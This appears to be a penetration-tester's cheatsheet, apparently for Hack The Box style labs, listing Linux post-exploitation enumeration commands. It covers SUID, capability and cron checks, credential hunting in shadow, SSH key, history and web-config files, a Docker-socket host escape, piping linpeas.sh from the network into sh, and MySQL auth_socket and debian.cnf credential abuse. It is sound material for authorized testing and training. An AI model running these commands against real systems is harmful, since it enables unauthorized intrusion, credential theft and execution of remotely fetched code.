---
title: "Linux Post-Exploitation Enumeration Cheatsheet"
type: cheatsheet
tags: [cheatsheet, enumeration, htb, linux, post-exploitation, privilege-escalation]
date_created: 2026-05-12
date_updated: 2026-07-14
sources: [git-htb-writeups, hacktricks-network]
---

# Linux Post-Exploitation Enumeration Cheatsheet

---

## System Information

```bash
uname -a                  # kernel version + arch
cat /etc/os-release       # distro name and version
cat /etc/issue
hostnamectl
arch; uname -m
cat /proc/version
```

---

## Users and Groups

```bash
id; whoami; groups
cat /etc/passwd
cat /etc/passwd | grep -v nologin | grep -v false   # real login accounts
cat /etc/group
cat /etc/shadow                                      # if readable
w; who; last                                         # logged-in users
sudo -l                                              # sudo permissions
```

---

## Network

```bash
ip a; ifconfig
ip route; route -n
ss -tulnp; netstat -tulnp               # listening ports
arp -a; ip neigh                        # ARP table
cat /etc/resolv.conf; cat /etc/hosts
iptables -L -n -v                       # firewall rules
```

---

## Processes and Services

```bash
ps aux; ps -ef
ps auxf; pstree                         # process tree
systemctl list-units --type=service --state=running
service --status-all
crontab -l
ls -la /etc/cron*; cat /etc/crontab
ls -la /var/spool/cron/crontabs/
systemctl list-timers                   # systemd timers
```

---

## SUID / SGID / Capabilities

```bash
# SUID binaries (check GTFOBins for each)
find / -perm -4000 -type f 2>/dev/null

# SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Both SUID+SGID
find / -perm -6000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Writable files
find / -writable -type f 2>/dev/null | grep -v proc
```

---

## File System — Interesting Files

```bash
# Config and credential files
find / -name "*.conf" -type f 2>/dev/null
find / -name "*.config" -type f 2>/dev/null
find / -name "*.db" -o -name "*.sqlite" -type f 2>/dev/null
find / -name "*.bak" -o -name "*.old" -type f 2>/dev/null
find / -name ".env" -type f 2>/dev/null
find / -name "id_rsa" -type f 2>/dev/null
find / -name "*.key" -o -name "*.pem" -type f 2>/dev/null

# Recently modified files
find / -mmin -10 -type f 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null

# Mounted filesystems
mount; df -h; cat /etc/fstab
```

---

## Interesting Locations

```bash
# Home directories
ls -la /home/; ls -la /root/

# SSH keys
ls -la ~/.ssh/
cat ~/.ssh/authorized_keys
cat ~/.ssh/id_rsa

# History files
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.psql_history

# Web app configs (common credential sources)
cat /etc/apache2/sites-enabled/*
cat /etc/nginx/sites-enabled/*
grep -ri "password" /var/www/ 2>/dev/null
grep -ri "DB_PASS" /var/www/ 2>/dev/null

# WordPress / Joomla / CMS database creds
cat /var/www/html/wp-config.php
cat /var/www/html/configuration.php
```

---

## Docker / Container Check

```bash
# Am I in a container?
cat /proc/1/cgroup | grep -i docker
ls -la /.dockerenv
hostname

# Docker socket (escape if available)
ls -la /var/run/docker.sock
docker images; docker ps -a
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## Internal Services

```bash
# Services only listening on localhost (potential pivot targets)
ss -tulnp | grep 127.0.0.1
netstat -tulnp | grep 127

# Port-forward to attacker for access
ssh -L 8080:127.0.0.1:8080 user@10.10.10.X
```

---

## Automated Tools

```bash
# LinPEAS — most comprehensive
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# linux-exploit-suggester — kernel CVE suggestions
./linux-exploit-suggester.sh

# pspy — monitor processes without root (catch cron jobs, SUID invocations)
./pspy64
```

---

## Quick Enumeration Order

```bash
id                                         # who am I
sudo -l                                    # sudo rights → check GTFOBins
find / -perm -4000 -type f 2>/dev/null     # SUID
getcap -r / 2>/dev/null                    # capabilities
cat /etc/crontab; ls -la /etc/cron.*       # cron jobs
./pspy64                                   # monitor running processes
find / -writable -type f 2>/dev/null | grep -v proc  # writable files
cat ~/.bash_history                        # command history with creds
find / -name "id_rsa" 2>/dev/null          # SSH keys
grep -ri "password" /var/www/ 2>/dev/null  # web app creds
uname -r                                   # kernel for exploit search
```

## MySQL local privilege escalation via auth_socket and client credential files

With shell access on a MySQL host, the fastest wins are the local socket plus auth
plugins and client cred files, not remote brute force. An account using
auth_socket/unix_socket lets the matching OS user log in over the local socket with no
DB password; readable debian.cnf or ~/.my.cnf hand you creds outright.

```bash
# Client cred files and the local socket
ls -l /run/mysqld/mysqld.sock /etc/mysql/debian.cnf ~/.my.cnf ~/.mylogin.cnf 2>/dev/null
cat /etc/mysql/debian.cnf     # plaintext debian-sys-maint password

# Inspect auth plugins and effective identity over the socket
mysql -S /run/mysqld/mysqld.sock -u root -e \
  "SELECT user,host,plugin,account_locked FROM mysql.user; SELECT USER(),CURRENT_USER();"

# Posture checks that reveal file-read/write primitives
mysql -S /run/mysqld/mysqld.sock -u root -e \
  "SHOW VARIABLES LIKE 'secure_file_priv'; SHOW VARIABLES LIKE 'local_infile';"

# Offline: hashes live in the MYD file if the DB is down
grep -oaE "[-_.*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v mysql_native_password
```

Look for auth_socket/unix_socket on privileged users, empty secure_file_priv, and
local_infile enabled where it is not needed.

---

## See Also

- [[linux-privesc]] — exploitation of all above vectors
- [[linux-privesc]] cheatsheet — attack commands
- [[docker-attacks]] — container escape techniques

## Map internal services via world-readable systemd units

When app directories are locked down (`drwxr-x---`, owned by root or other service accounts) you
often cannot read the source, but `/etc/systemd/system/*.service` units are world-readable (644).
`cat` them to recover each internal service's identity for free:

```
cat /etc/systemd/system/*.service
systemctl list-timers --all --no-pager
```

Each unit reveals `User=`/`Group=` (which service runs as ROOT vs a low-priv svc account),
`ExecStart=` (the bind address/port, e.g. `--bind 127.0.0.1:9000`), `WorkingDirectory=`, and
`EnvironmentFile=` (where the secrets live). This maps a multi-tier app, which loopback port is the
root-running one and therefore the privesc target, without reading a single app source file.

Also read the timers: a job/export service driven by NO `.timer` (and no cron) is triggered
on-demand, so do not waste time running pspy to catch a periodic caller that does not exist, find
who holds its token instead (a peer service / admin panel).

<!-- promoted-slug: systemd-unit-service-mapping -->
